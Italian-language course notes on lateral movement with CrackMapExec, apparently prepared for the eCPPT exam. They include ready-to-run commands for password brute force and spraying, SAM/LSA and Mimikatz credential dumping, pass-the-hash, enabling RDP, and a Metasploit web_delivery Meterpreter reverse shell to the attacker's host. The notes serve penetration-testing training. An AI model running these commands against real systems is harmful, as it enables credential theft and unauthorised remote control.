# 06 — Lateral Movement with CrackMapExec

> **Modulo:** Lateral Movement & Pivoting · **Video:** 6/16
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [06_Lateral Movement with CrackMapExec.txt](06_Lateral Movement with CrackMapExec.txt) · [06_Lateral Movement with CrackMapExec.srt](06_Lateral Movement with CrackMapExec.srt)

## Concetti chiave

- **CrackMapExec (CME)** = "Swiss army knife for pentesting networks" — tool catch-all per Windows lateral movement.
- Supporta **multipli protocolli**: SMB, WinRM, MSSQL, SSH, LDAP.
- Funzioni: **password spray, brute force, credential validation, Pass-the-Hash, command execution, hash dump, moduli avanzati**.
- Può girare su **interi subnet** simultaneamente — automatizza ciò che PsExec/SMBExec fanno per un singolo host.
- Non fornisce shell interattiva: esegue comandi singoli (`-x` CMD, `-X` PowerShell) o invoca moduli.
- I **moduli** (es. `mimikatz`, `web_delivery`, `rdp`, `lsassy`) estendono enormemente le capacità.

## Spiegazione approfondita

### Sintassi base
```
crackmapexec <protocol> <target(s)> -u <user> -p <password|wordlist> [--local-auth] [options]
```
- `<protocol>` → **DEVE essere il primo argomento** dopo `crackmapexec`.
- `<target>` può essere IP singolo, range, CIDR, file.
- `--local-auth` → forza autenticazione **come local account** (importante in domain env per evitare che CME provi auth come domain user).

### Output e indicatori
- `[+]` verde → **credenziale valida** ma senza privilegi di esecuzione (utile per spray dove cerchi "Pwn3d!" per admin valido).
- `[+] (Pwn3d!)` → credenziale valida **+ accesso admin** → exec disponibile.
- `[-]` → fallita.

### Esecuzione comandi
- `-x '<cmd>'` → esegue CMD command (es. `whoami`, `ipconfig`).
- `-X '<ps_cmd>'` → esegue PowerShell command (es. `$PSVersionTable`).
- Encapsulare in **single/double quotes** per evitare problemi con caratteri speciali/spazi nella password.

### Pass-the-Hash con CME
```
crackmapexec smb <target> -u administrator -H <NT_HASH>
```
- `-H` accetta direttamente NT hash (no formato LM:NT).

### Moduli (`-M <module> -o KEY=value`)
- `-L` → lista moduli disponibili.
- Esempi: `mimikatz`, `lsassy`, `web_delivery`, `rdp`, `enum_dns`, `wdigest`.
- Esempio uso: `cme smb <target> -u admin -p pass -M mimikatz` → dump credenziali in memoria.
- Esempio `rdp`: abilita RDP sul target con `-M rdp -o ACTION=enable`.

### Comandi nativi SMB
CME ha funzioni built-in (non moduli) per: `--shares`, `--sessions`, `--disks`, `--loggedon-users`, `--sam`, `--lsa`, `--ntds`.

## Comandi & strumenti

```bash
# Pre-check
nmap -p 445 --script smb-protocols <TARGET_IP>

# Lista protocolli supportati
crackmapexec

# Help SMB-specifico
crackmapexec smb -h

# Lista moduli SMB
crackmapexec smb -L

# Brute force password per administrator
crackmapexec smb <TARGET_IP> -u administrator \
  -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

# Spray + username enum (UxP)
crackmapexec smb <TARGET_IP> \
  -u /usr/share/metasploit-framework/data/wordlists/common_users.txt \
  -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

# Authentication check (Pwn3d!?)
crackmapexec smb <TARGET_IP> -u administrator -p 'Sebastian' --local-auth

# Esecuzione comando CMD
crackmapexec smb <TARGET_IP> -u administrator -p 'Sebastian' -x 'whoami /priv'

# Esecuzione comando PowerShell
crackmapexec smb <TARGET_IP> -u administrator -p 'Sebastian' -X '$PSVersionTable'

# Pass-the-Hash
crackmapexec smb <TARGET_IP> -u administrator -H <NT_HASH>

# Hash dump (SAM)
crackmapexec smb <TARGET_IP> -u administrator -p 'Sebastian' --sam

# Dump LSA secrets
crackmapexec smb <TARGET_IP> -u administrator -p 'Sebastian' --lsa

# Lista shares
crackmapexec smb <TARGET_IP> -u administrator -p 'Sebastian' --shares

# Modulo Mimikatz (dump credenziali)
crackmapexec smb <TARGET_IP> -u administrator -p 'Sebastian' -M mimikatz

# Modulo web_delivery (Meterpreter via Metasploit web_delivery server)
crackmapexec smb <TARGET_IP> -u administrator -p 'Sebastian' \
  -M web_delivery -o URL=<MSF_WEB_DELIVERY_URL>

# Abilita RDP sul target
crackmapexec smb <TARGET_IP> -u administrator -p 'Sebastian' -M rdp -o ACTION=enable
```

## Esempi pratici

```bash
# Workflow completo (dal video):

# 1. Spray administrator
crackmapexec smb <TARGET_IP> -u administrator \
  -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
# → password: Sebastian → "Pwn3d!"

# 2. Verifica con comando
crackmapexec smb <TARGET_IP> -u administrator -p 'Sebastian' -x whoami
# → nt authority\system

# 3. Dump SAM (NTLM hash)
crackmapexec smb <TARGET_IP> -u administrator -p 'Sebastian' --sam
# → administrator:500:aad3b4...:<NT_HASH>:::

# 4. Pass-the-Hash con l'hash ottenuto
crackmapexec smb <TARGET_IP> -u administrator -H <NT_HASH> -x ipconfig

# 5. Spray multiplo (UxP) per scoprire altri account
crackmapexec smb <TARGET_IP> \
  -u /usr/share/metasploit-framework/data/wordlists/common_users.txt \
  -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
# → sysadmin:strawberry → valido ma SENZA Pwn3d! (non admin)

# 6. Meterpreter via web_delivery module
# In MSF:
use exploit/multi/script/web_delivery
set payload windows/meterpreter/reverse_tcp
set LHOST <KALI_IP>
set TARGET 2
exploit
# Copia l'URL e:
crackmapexec smb <TARGET_IP> -u administrator -p 'Sebastian' \
  -M web_delivery -o URL=http://<KALI_IP>:8080/xxxxx

# 7. Pivot a RDP
crackmapexec smb <TARGET_IP> -u administrator -p 'Sebastian' -M rdp -o ACTION=enable
xfreerdp /u:administrator /p:Sebastian /v:<TARGET_IP>
```

## Punti d'attenzione per l'esame eCPPT

- **Sintassi obbligatoria**: `crackmapexec <protocol> <target> ...` — protocollo come PRIMO arg.
- **`-x` vs `-X`**: lowercase = CMD, UPPERCASE = PowerShell. **Domanda d'esame**.
- **`Pwn3d!`** indicator = utente è **local admin** sul target.
- **`--local-auth`** in ambienti AD per forzare local account (evita lookup domain).
- **`-H <NT_HASH>`** per PTH (formato senza `:LM:`).
- Protocolli supportati: **SMB, WinRM, MSSQL, SSH, LDAP** (no RDP nativamente — RDP si abilita via modulo `rdp`).
- **CME = enumeratore + executor + spray + PTH**. Sostituisce molti tool ma NON dà shell — per shell usa `web_delivery` o moduli.
- Quote (single/double) per password con caratteri speciali → frequente fonte di errore.
- I moduli sono il vero superpotere: `-L` per listarli, conoscere almeno `mimikatz`, `web_delivery`, `rdp`, `lsassy`.

## Collegamenti con altri video

- Precedente: [[05_Lateral Movement with SMBExec]]
- Prossimo: [[07_Lateral Movement via RDP]] — protocollo abilitato in chiusura del video.
- Alternative PTH: [[04_Lateral Movement with PsExec]] · [[09_Pass-the-Hash with Metasploit]] · [[010_Pass-the-Hash with WMIExec]]
- WinRM via CME: [[08_Lateral Movement via WinRM]]
